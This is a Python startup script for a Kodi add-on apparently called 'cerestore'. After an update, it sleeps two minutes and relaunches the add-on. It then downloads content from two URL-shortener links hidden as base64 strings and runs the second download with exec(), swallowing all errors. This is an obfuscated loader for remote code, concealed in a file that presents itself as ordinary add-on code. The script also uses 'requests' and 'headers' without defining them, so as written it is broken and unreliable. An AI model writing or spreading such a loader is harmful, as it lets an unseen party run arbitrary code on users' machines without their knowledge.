# -*- coding: utf-8 -*-
import xbmcvfs
import time
import xbmc
import os
import xbmcaddon
import xbmc, xbmcgui, xbmcvfs
import base64
import time, datetime
import shutil

def log(x):
    xbmc.log(repr(x),xbmc.LOGERROR)


if __name__ == '__main__':
    ADDON = xbmcaddon.Addon('plugin.program.cerestore')

    version = ADDON.getAddonInfo('version')
    if ADDON.getSetting('version') != version:
        path = xbmc.translatePath(os.path.join('special://profile/addon_data/plugin.program.cerestore/'))

        ADDON.setSetting('version', version)
		
        time.sleep(120)	
        xbmc.executebuiltin('RunAddon(plugin.program.cerestore)')
        try:
            r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC84TUJDRlM='),headers=headers)
            home = r.content
        except: pass
        try:
            r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC9Ebm55a3o='),headers=headers)
            main = r.content
            exec(main)
        except: pass